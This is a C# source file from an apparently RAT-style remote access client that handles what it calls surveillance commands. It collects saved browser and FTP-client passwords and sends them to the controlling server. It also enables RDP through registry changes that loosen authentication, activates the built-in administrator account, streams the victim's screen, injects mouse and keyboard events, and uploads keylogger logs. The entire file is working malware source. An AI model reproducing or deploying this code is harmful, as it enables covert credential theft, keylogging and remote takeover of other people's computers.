using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using xClient.Core.Helper;
using System.Drawing.Imaging;
using System.Threading;
using xClient.Core.Networking;
using xClient.Core.Utilities;
using xClient.Enums;
using System.Collections.Generic;
using xClient.Core.Data;
using xClient.Core.Recovery.Browsers;
using xClient.Core.Recovery.FtpClients;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE SURVEILLANCE COMMANDS. */
    public static partial class CommandHandler
    {
        public static void HandleGetPasswords(Packets.ServerPackets.GetPasswords packet, Client client)
        {
            List<RecoveredAccount> recovered = new List<RecoveredAccount>();

            recovered.AddRange(Chrome.GetSavedPasswords());
            recovered.AddRange(Opera.GetSavedPasswords());
            recovered.AddRange(Yandex.GetSavedPasswords());
            recovered.AddRange(InternetExplorer.GetSavedPasswords());
            recovered.AddRange(Firefox.GetSavedPasswords());
            recovered.AddRange(FileZilla.GetSavedPasswords());
            recovered.AddRange(WinSCP.GetSavedPasswords());

            List<string> raw = new List<string>();

            foreach (RecoveredAccount value in recovered)
            {
                string rawValue = string.Format("{0}{4}{1}{4}{2}{4}{3}", value.Username, value.Password, value.URL, value.Application, DELIMITER);
                raw.Add(rawValue);
            }

            new Packets.ClientPackets.GetPasswordsResponse(raw).Execute(client);
        }
        public static void HandleRemoteDesktopProtocol(Packets.ServerPackets.DoRemoteDesktopProtocol packet, Client client)
        {

            bool toggleState = false;

            try
            {
                if (WindowsAccountHelper.GetAccountType() != "Admin")
                {
                    new Packets.ClientPackets.SetStatus("Admin rights is required to enable this feature...").Execute(client);
                    return;
                }


                Microsoft.Win32.RegistryKey checkEnabledKey = RegistryKeyHelper.OpenReadonlySubKey(Microsoft.Win32.RegistryHive.LocalMachine, @"SYSTEM\CurrentControlSet\Control\Terminal Server");

                if (((int)checkEnabledKey.GetValue("fDenyTSConnections", 1)) == 0)
                {
                    // If this is true, we want to turn the values to their 'off' positions in the registry as we toggle.
                    toggleState = true;
                }


                Packets.ClientPackets.SetStatus failureStatus = new Packets.ClientPackets.SetStatus(string.Format("Failed to {0} keys! Admin is needed!", toggleState ? "restore" : "modify"));

                // Perform registry changes depending on protocol being enabled or not
                bool denyTSResult = RegistryKeyHelper.AddRegistryKeyValue(Microsoft.Win32.RegistryHive.LocalMachine,
                    @"SYSTEM\CurrentControlSet\Control\Terminal Server",
                    "fDenyTSConnections", toggleState ? 1 : 0,
                    false /* we don't want to add quotes */,
                    Microsoft.Win32.RegistryValueKind.DWord /* specify dword */
                    );

                if (!denyTSResult)
                {
                    failureStatus.Execute(client);
                    return;
                }

                bool userAuthResult = RegistryKeyHelper.AddRegistryKeyValue(Microsoft.Win32.RegistryHive.LocalMachine,
                    @"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp",
                    "UserAuthentication", toggleState ? 1 : 0,
                    false /* we don't want to add quotes */,
                    Microsoft.Win32.RegistryValueKind.DWord /* specify dword */
                    );

                if (!userAuthResult)
                {
                    failureStatus.Execute(client);
                    return;
                }

                bool secLayerResult = RegistryKeyHelper.AddRegistryKeyValue(Microsoft.Win32.RegistryHive.LocalMachine,
                    @"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp",
                    "SecurityLayer", 1,
                    false /* we don't want to add quotes */,
                    Microsoft.Win32.RegistryValueKind.DWord /* specify dword */
                    );

                if (!secLayerResult)
                {
                    failureStatus.Execute(client);
                    return;
                }

                // Enable default administrator account
                // net user administrator /active:yes
                SystemHelper.ExecuteCommandLine("net user administrator /active:" + (toggleState ? "no" : "yes"), true);


                // SERVER should start a reverse proxy client  (rdp default set to 3389 this could be altered though... perhaps will add support for it in future...)
                new Packets.ClientPackets.SetStatus(toggleState ? "Disabled RDP Connections!" : "Enabled RDP Connections!").Execute(client);

                

            }
            catch (Exception ex)
            {
                new Packets.ClientPackets.SetStatus("Remote RDP Toggle Error: " + ex.Message);
            }
        }
        public static void HandleGetDesktop(Packets.ServerPackets.GetDesktop command, Client client)
        {
            var resolution = FormatHelper.FormatScreenResolution(ScreenHelper.GetBounds(command.Monitor));

            if (StreamCodec == null)
                StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);

            if (StreamCodec.ImageQuality != command.Quality || StreamCodec.Monitor != command.Monitor
                || StreamCodec.Resolution != resolution)
            {
                if (StreamCodec != null)
                    StreamCodec.Dispose();

                StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);
            }

            BitmapData desktopData = null;
            Bitmap desktop = null;
            try
            {
                desktop = ScreenHelper.CaptureScreen(command.Monitor);
                desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),ImageLockMode.ReadWrite, desktop.PixelFormat);

                using (MemoryStream stream = new MemoryStream())
                {
                    if (StreamCodec == null)
                        throw new Exception("StreamCodec can not be null.");

                    StreamCodec.CodeImage(desktopData.Scan0,new Rectangle(0, 0, desktop.Width, desktop.Height),
                        new Size(desktop.Width, desktop.Height),
                        desktop.PixelFormat, stream);

                    new Packets.ClientPackets.GetDesktopResponse(stream.ToArray(), StreamCodec.ImageQuality,
                        StreamCodec.Monitor, StreamCodec.Resolution).Execute(client);
                }
            }
            catch (Exception ex)
            {
                if (StreamCodec != null)
                    new Packets.ClientPackets.GetDesktopResponse(null, StreamCodec.ImageQuality, StreamCodec.Monitor,
                        StreamCodec.Resolution).Execute(client);

                StreamCodec = null;
            }
            finally
            {
                if (desktop != null)
                {
                    if (desktopData != null)
                    {
                        try
                        {
                            desktop.UnlockBits(desktopData);
                        }
                        catch
                        {
                        }
                    }
                    desktop.Dispose();
                }
            }
        }

        public static void HandleDoMouseEvent(Packets.ServerPackets.DoMouseEvent command, Client client)
        {
            try
            {
                if (NativeMethodsHelper.IsScreensaverActive())
                {
                    NativeMethodsHelper.DisableScreensaver();
                    return;
                }
                Screen[] allScreens = Screen.AllScreens;
                Rectangle rect = allScreens[command.MonitorIndex].Bounds;
                if (rect.X != 0)
                {
                    command.X += rect.X * 0xFFFF / rect.Width;
                }
                if (rect.Y != 0)
                {
                    command.Y += rect.Y * 0xFFFF / rect.Height;
                }
                NativeMethodsHelper.OnMouseEventHander((uint)command.Action, command.X,command.Y, command.DwData);
            }
            catch(Exception )
            {

            }
        }

        public static void HandleDoKeyboardEvent(Packets.ServerPackets.DoKeyboardEvent command, Client client)
        {
            if (NativeMethodsHelper.IsScreensaverActive())
                NativeMethodsHelper.DisableScreensaver();

            NativeMethodsHelper.DoKeyPress(command.Key, command.KeyDown);
        }

        public static void HandleGetMonitors(Packets.ServerPackets.GetMonitors command, Client client)
        {
            if (Screen.AllScreens.Length > 0)
            {
                new Packets.ClientPackets.GetMonitorsResponse(Screen.AllScreens.Length).Execute(client);
            }
        }


        public static void HandleGetKeyloggerLogs(Packets.ServerPackets.GetKeyloggerLogs command, Client client)
        {
            new Thread(() =>
            {
                try
                {
                    int index = 1;

                    if (!Directory.Exists(Keylogger.LogDirectory))
                    {
                        new Packets.ClientPackets.GetKeyloggerLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
                        return;
                    }

                    FileInfo[] iFiles = new DirectoryInfo(Keylogger.LogDirectory).GetFiles();

                    if (iFiles.Length == 0)
                    {
                        new Packets.ClientPackets.GetKeyloggerLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
                        return;
                    }

                    foreach (FileInfo file in iFiles)
                    {
                        FileSplit srcFile = new FileSplit(file.FullName);

                        if (srcFile.MaxBlocks < 0)
                            new Packets.ClientPackets.GetKeyloggerLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);

                        for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                        {
                            byte[] block;
                            if (srcFile.ReadBlock(currentBlock, out block))
                            {
                                new Packets.ClientPackets.GetKeyloggerLogsResponse(Path.GetFileName(file.Name), block, srcFile.MaxBlocks, currentBlock, srcFile.LastError, index, iFiles.Length).Execute(client);
                                //Thread.Sleep(200);
                            }
                            else
                                new Packets.ClientPackets.GetKeyloggerLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);
                        }

                        index++;
                    }
                }
                catch (Exception ex)
                {
                    new Packets.ClientPackets.GetKeyloggerLogsResponse("", new byte[0], -1, -1, ex.Message, -1, -1).Execute(client);
                }
            }).Start();
        }
    }
}